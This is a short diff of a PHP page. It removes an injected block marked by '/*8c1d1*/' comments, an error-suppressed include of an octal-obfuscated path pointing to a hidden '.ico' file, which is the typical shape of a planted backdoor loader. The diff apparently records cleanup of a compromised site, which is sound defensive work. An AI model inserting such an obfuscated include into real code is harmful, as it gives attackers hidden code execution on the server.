@@ -1,10 +1,5 @@
 <?php
 
-/*8c1d1*/
-
-@include "\057ho\155e/\163io\057ww\167/w\151ki\057.7\066e3\06176\061.i\143o";
-
-/*8c1d1*/
 require_once("../config.inc.php");
 include (INSTALL_DIR."/inc/entetes.inc.php");
 
